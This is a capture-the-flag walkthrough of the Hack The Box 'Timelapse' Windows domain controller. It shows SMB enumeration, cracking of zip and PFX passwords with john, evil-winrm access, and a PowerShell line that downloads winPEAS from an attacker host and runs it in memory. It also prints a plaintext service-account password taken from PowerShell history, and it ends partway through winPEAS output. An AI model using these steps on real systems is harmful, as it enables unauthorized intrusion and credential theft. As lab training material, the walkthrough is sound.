# Timelapse

## Enumeration
````
# nmap -sV -p- --min-rate 9000 10.10.11.152 -oA nmap-10.10.11.152-sV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-01 07:33 EDT
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 6.02% done; ETC: 07:34 (0:00:16 remaining)
Nmap scan report for 10.10.11.152
Host is up (0.14s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-01 19:34:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
54451/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.30 seconds
````

````
enum4linux -a -u "blah" -p "" 10.10.11.152
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Apr  1 07:42:17 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.11.152
RID Range ........ 500-550,1000-1050
Username ......... 'blah'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.11.152    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.11.152    |
 ============================================ 
Looking up status of 10.10.11.152
No reply from 10.10.11.152

 ===================================== 
|    Session Check on 10.10.11.152    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.10.11.152 allows sessions using username 'blah', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.11.152    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Bad SMB2 signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] C4 E1 35 83 F3 85 3E DB   43 3B 63 A3 E6 0A E7 45   ..5...>. C;c....E
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.11.152    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.11.152 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.10.11.152 from srvinfo:
Bad SMB2 signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 30 A8 A1 2A 43 93 13 0F   47 ED 67 AB 00 EA 69 46   0..*C... G.g...iF
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.11.152    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================= 
|    Share Enumeration on 10.10.11.152    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.11.152
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/ADMIN$   Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/C$       Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/IPC$     [E] Can't understand response:
NT_STATUS_INVALID_INFO_CLASS listing \*                                                                                                                      
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/NETLOGON Mapping: OK     Listing: DENIED
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/Shares   Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/SYSVOL   Mapping: OK     Listing: DENIED

 ==================================================== 
|    Password Policy Information for 10.10.11.152    |
 ==================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 10.10.11.152 using blah

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.11.152)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[E] Failed to get password policy with rpcclient


 ============================== 
|    Groups on 10.10.11.152    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.11.152 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.

 ============================================= 
|    Getting printer info for 10.10.11.152    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
Bad SMB2 signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] E4 5D 46 96 E7 6F 01 F5   11 6F E8 23 6B BB C2 54   .]F..o.. .o.#k..T
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Fri Apr  1 07:43:02 2022
````
:new: Shares

## User 
````
root@kali:~/Desktop/htb/timelapse# smbclient //10.10.11.152/Shares -U guest
Enter WORKGROUP\guest's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 1538792 blocks available
smb: \> ls Dev/
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

                6367231 blocks of size 4096. 1538792 blocks available
smb: \> ls HelpDesk/
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021

                6367231 blocks of size 4096. 1538792 blocks available
smb: \> 

smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (4.4 KiloBytes/sec) (average 4.4 KiloBytes/sec)
````

````
7z l winrm_backup.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz (906EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 2611 bytes (3 KiB)

Listing archive: winrm_backup.zip

--
Path = winrm_backup.zip
Type = zip
Physical Size = 2611

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-25 10:21:20 .....         2555         2405  legacyy_dev_auth.pfx
------------------- ----- ------------ ------------  ------------------------
2021-10-25 10:21:20               2555         2405  1 files
````

````
# 7z l -slt winrm_backup.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz (906EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 2611 bytes (3 KiB)

Listing archive: winrm_backup.zip

--
Path = winrm_backup.zip
Type = zip
Physical Size = 2611

----------
Path = legacyy_dev_auth.pfx
Folder = -
Size = 2555
Packed Size = 2405
Modified = 2021-10-25 10:21:20
Created = 
Accessed = 
Attributes = _ -rwxr-xr-x
Encrypted = +
Comment = 
CRC = 12EC5683
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0
````
ZipCrypto Deflate is vulnerable to known plaintext attack but we can try first rockyou

````
$ zip2john winrm_backup.zip > ziphash

$ john --wordlist=/usr/share/wordlists/rockyou.txt ziphash

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
fopen: /usr/share/wordlists/rockyou.txt: No such file or directory
root@kali:~/Desktop/htb/timelapse# john --wordlist=/root/rockyou.txt ziphash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2022-04-01 07:54) 1.075g/s 3729Kp/s 3729Kc/s 3729KC/s suprgirl..supreme99
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
````

````
$ python2 /opt/2john/pfx2john.py legacyy_dev_auth.pfx > hash_pfx

$ john --wordlist=/root/rockyou.txt --format=pfx pfx_hash 

Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:02:12 DONE (2022-04-01 08:33) 0.007568g/s 24451p/s 24451c/s 24451C/s thuglife06..thuglady01
Use the "--show" opti
````

````
# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -out prv.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:

$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
Enter Import Password:
````

````
$ evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u
*Evil-WinRM* PS C:\Users\legacyy\Desktop> cat user.txt
8acd93fced1257b5205467e86f96d6ff
````

````
$url = "10.10.15.6:9090/winPEAS.exe"
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
````



````
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type "C:/Users/legacyy/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
````


````
 powershell "Invoke-WebRequest -UseBasicParsing 10.10.15.6/winPEASx64.exe -OutFile winPEASx64.exe"
Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents> "C:/Users/legacyy/Documents/winPEASx64.exe"
C:/Users/legacyy/Documents/winPEASx64.exe
*Evil-WinRM* PS C:\Users\legacyy\Documents> ./winPEASx64.exe
Enter PEM pass phrase:
ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD

               ((((((((((((((((((((((((((((((((                                                                                                              
        (((((((((((((((((((((((((((((((((((((((((((                                                                                                          
      ((((((((((((((**********/##########.((((((((((((                                                                                                       
    (((((((((((/********************/#######.((((((((((                                                                                                      
    (((((((.******************/@@@@@/****######.(((((((((                                                                                                    
    (((((.********************@@@@@@@@@@/***,####.(((((((((                                                                                                  
    ((((.********************/@@@@@%@@@@/********##(((((((((                                                                                                 
    .((############*********/%@@@@@@@@@/************.(((((((                                                                                                 
    .(##################(/******/@@@@@/***************.(((((                                                                                                 
    .(#########################(/**********************.((((                                                                                                 
    .(##############################(/*****************.((((                                                                                                 
    .(###################################(/************.((((                                                                                                 
    .(#######################################(*********.((((                                                                                                 
    .(#######(,.***.,(###################(..***.*******.((((                                                                                                 
    .(#######*(#####((##################((######/(*****.((((                                                                                                 
    .(###################(/***********(##############().((((                                                                                                 
    .((#####################/*******(################)((((((                                                                                                 
    .(((############################################).(((((                                                                                                  
    ..(((##########################################).((((((                                                                                                  
    ....((########################################).((((((                                                                                                   
    ......((####################################).(((((((                                                                                                    
    (((((((((#################################).((((((((                                                                                                     
        (((((((((/##########################).((((((((                                                                                                       
              ((((((((((((((((((((((((((((((((((((((                                                                                                         
                 ((((((((((((((((((((((((((((((                                                                                                              

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                       
                                                                                                                                                             
  WinPEASng by @carlospolopm, makikvues(makikvues2[at]gmail[dot]com)                                                                                         

       /---------------------------------------------------------------------------\                                                                         
       |                             Do you like PEASS?                            |                                                                         
       |---------------------------------------------------------------------------|                                                                         
       |         Become a Patreon    :     https://www.patreon.com/peass           |                                                                         
       |         Follow on Twitter   :     @carlospolopm                           |                                                                         
       |         Respect on HTB      :     SirBroccoli & makikvues                 |                                                                         
       |---------------------------------------------------------------------------|                                                                         
       |                                 Thank you!                                |                                                                         
       \---------------------------------------------------------------------------/                                                                         
                                                                                                                                                             
  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

È You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
   Creating Dynamic lists, this could take a while, please wait...
   - Loading YAML definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()                                                                                                               
   at System.Management.ManagementScope.Initialize()                                                                                                         
   at System.Management.ManagementObjectSearcher.Initialize()                                                                                                
   at System.Management.ManagementObjectSearcher.Get()                                                                                                       
   at winPEAS.Checks.Checks.CreateDynamicLists()                                                                                                             
   - Creating current user groups list...
   - Creating active users list (local only)...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating disabled users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Admin users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ System Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Basic System Information
È Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
  [X] Exception: Access denied 
  [X] Exception: Access denied 
  [X] Exception: The given key was not present in the dictionary.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing All Microsoft Updates
  [X] Exception: Creating an instance of the COM component with CLSID {B699E5E8-67FF-4177-88B0-3684A3388BFB} from the IClassFactory failed due to the following error: 80070005 Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)).                                                                  

ÉÍÍÍÍÍÍÍÍÍÍ¹ System Last Shutdown Date/time (from Registry)
                                                                                                                                                             
    Last Shutdown Date/time        :    3/21/2022 8:52:02 PM

ÉÍÍÍÍÍÍÍÍÍÍ¹ User Environment Variables
È Check for some passwords or keys in the env variables 
    COMPUTERNAME: DC01
    PUBLIC: C:\Users\Public
    LOCALAPPDATA: C:\Users\legacyy\AppData\Local
    PSModulePath: C:\Users\legacyy\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\legacyy\AppData\Local\Microsoft\WindowsApps
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 23
    ProgramFiles: C:\Program Files
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    USERPROFILE: C:\Users\legacyy
    SystemRoot: C:\Windows
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    ProgramData: C:\ProgramData
    PROCESSOR_REVISION: 3100
    USERNAME: legacyy
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
    ComSpec: C:\Windows\system32\cmd.exe
    SystemDrive: C:
    TEMP: C:\Users\legacyy\AppData\Local\Temp
    NUMBER_OF_PROCESSORS: 2
    APPDATA: C:\Users\legacyy\AppData\Roaming
    TMP: C:\Users\legacyy\AppData\Local\Temp
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: TIMELAPSE
    USERDNSDOMAIN: TIMELAPSE.HTB

ÉÍÍÍÍÍÍÍÍÍÍ¹ System Environment Variables
È Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 23
    PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
    PROCESSOR_REVISION: 3100

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Settings
È Check what is being logged 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Policy Settings - Classic & Advanced

ÉÍÍÍÍÍÍÍÍÍÍ¹ WEF Settings
È Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings
È If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: 1
    LAPS Admin Account Name: 
    LAPS Password Complexity: 4
    LAPS Password Length: 24
    LAPS Expiration Protection Enabled: 1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Wdigest
È If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest
    Wdigest is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ LSA Protection
È If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection                                                                                  
    LSA Protection is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Credentials Guard
È If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
    CredentialGuard is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds
È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials                                                                                                                                    
    cachedlogonscount is 10

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating saved credentials in Registry (CurrentPass)

ÉÍÍÍÍÍÍÍÍÍÍ¹ AV Information
  [X] Exception: Invalid namespace 
    No AV was detected!!
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Windows Defender configuration
  Local Settings
  Group Policy Settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ UAC Status
È If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access                                                                                                                                      
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken: 
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.                                                                             

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 434B

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PS default transcripts history
È Read the PS history inside these files (if any)

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKCU Internet Settings
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    CertificateRevocation: 1
    ZonesSecurityUpgrade: System.Byte[]

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
È Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 4 GB)(Permissions: Users [AppendData/CreateDirectories])

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AlwaysInstallElevated
È  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated isn't available

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate LSA settings - auth packages included
                                                                                                                                                             
    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Security Packages                    :       ""
    Notification Packages                :       rassfm,scecli
    Authentication Packages              :       msv1_0
    LsaPid                               :       660
    LsaCfgFlagsDefault                   :       0
    SecureBoot                           :       1
    ProductType                          :       7
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)
                                                                                                                                                             

  NTLM Signing Settings                                                                                                                                      
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : True
      ServerNegotiateSigning  : True
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security                                                                                                                                           
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)
                                                                                                                                                             

  NTLM Auditing and Restrictions                                                                                                                             
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      :

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Local Group Policy settings - local users/machine

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Printers (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Named Pipes
  Name                                                                                                 Sddl

  eventlog                                                                                             O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)                                                                                             
                                                                                                                                                             
  ROUTER                                                                                               O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)                                                                                                                                                        
                                                                                                                                                             
  RpcProxy\49674                                                                                       O:BAG:SYD:(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;BA)                                                                                                                                                         
                                                                                                                                                             
  RpcProxy\593                                                                                         O:NSG:NSD:(A;;0x12019b;;;WD)(A;;RC;;;OW)(A;;0x12019b;;;AN)(A;;FA;;;S-1-5-80-521322694-906040134-3864710659-1525148216-3451224162)(A;;FA;;;S-1-5-80-979556362-403687129-3954533659-2335141334-1547273080)           
                                                                                                                                                             
  vgauth-service                                                                                       O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
                                                                                                                                                             

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating AMSI registered providers
    Provider:       {2781761E-28E0-4109-99FE-B9D127C57AFE}
    Path:           "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2202.4-0\MpOav.dll"

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon configuration
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed .NET versions
                                                                                                                                                             


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting Events information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials
                                                                                                                                                             
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Account Logon Events (4624) for the last 10 days.
                                                                                                                                                             
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Process creation events - searching logs (EID 4688) for sensitive data.
                                                                                                                                                             
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.
                                                                                                                                                             
  [X] Exception: Attempted to perform an unauthorized operation.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Displaying Power off/on events for last 5 days
